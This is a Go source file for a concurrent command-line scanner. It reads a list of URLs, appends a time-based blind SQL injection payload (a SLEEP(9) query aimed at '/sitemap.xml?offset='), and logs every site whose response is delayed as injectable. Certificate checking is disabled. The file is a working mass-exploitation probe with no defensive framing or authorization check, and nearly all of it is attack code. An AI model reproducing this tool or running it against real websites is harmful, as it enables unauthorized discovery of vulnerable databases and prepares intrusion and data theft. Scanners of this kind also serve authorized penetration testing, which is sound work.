package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// measureResponseTime sends an HTTP request and measures response time
func measureResponseTime(url string) (float64, error) {
	// Disable SSL certificate verification
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}

	start := time.Now()
	resp, err := client.Get(url)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	elapsed := time.Since(start).Seconds()
	return elapsed, nil
}

// processURL handles the request logic for a single URL
func processURL(url string, silentMode bool, outputPath string, mu *sync.Mutex, wg *sync.WaitGroup) {
	defer wg.Done()

	url = strings.TrimSpace(url)
	if url == "" {
		return
	}

	// Measure response time of the original URL
	originalTime, err := measureResponseTime(url)
	if err != nil {
		return
	}

	// If the first request takes more than 3 seconds, skip it
	if originalTime > 3 {
		if !silentMode { // Only show skipped messages in normal mode
			logResult(fmt.Sprintf("%s [SKIPPED: Response time exceeded 3 seconds]", url), outputPath, mu)
		}
		return
	}

	// Construct the modified URL with payload
	modifiedURL := url + "/sitemap.xml?offset=1;SELECT%20IF((8303%3E8302),SLEEP(9),2356)#"

	// Measure response time of the modified URL
	modifiedTime, err := measureResponseTime(modifiedURL)
	if err != nil {
		return
	}

	// Silent mode: Only write if second request exceeds 8 seconds
	if silentMode {
		if modifiedTime > 8 {
			logResult(modifiedURL, outputPath, mu)
		}
	} else {
		// Normal mode: Print everything
		logResult(fmt.Sprintf("%s [%.3f sec] -> %s [%.3f sec]", url, originalTime, modifiedURL, modifiedTime), outputPath, mu)
	}
}

// logResult writes results immediately to prevent high memory usage
func logResult(result string, outputPath string, mu *sync.Mutex) {
	mu.Lock()
	defer mu.Unlock()

	fmt.Println(result) // Print to console

	// Append result directly to the file
	file, err := os.OpenFile(outputPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	fmt.Fprintln(writer, result)
	writer.Flush()
}

func main() {
	// Define CLI flags
	listPath := flag.String("l", "", "Path to the text file containing URLs")
	outputPath := flag.String("o", "", "Output file path")
	silentMode := flag.Bool("silent", false, "Only display URLs where the crafted payload exceeds 8 seconds")
	workers := flag.Int("w", 12, "Number of concurrent workers (default: 12)")
	flag.Parse()

	// Validate required arguments
	if *listPath == "" || *outputPath == "" {
		fmt.Println("Usage: go run tool.go -l [list path] -o [output path] -w [workers] [--silent]")
		os.Exit(1)
	}

	// Open input file
	file, err := os.Open(*listPath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	// Use goroutines with a worker pool
	var wg sync.WaitGroup
	var mu sync.Mutex
	urls := make(chan string, *workers)

	// Start worker pool
	for i := 0; i < *workers; i++ {
		go func() {
			for url := range urls {
				processURL(url, *silentMode, *outputPath, &mu, &wg)
			}
		}()
	}

	// Read URLs and add them to the queue
	for scanner.Scan() {
		url := scanner.Text()
		wg.Add(1)
		urls <- url
	}

	close(urls)
	wg.Wait()
}
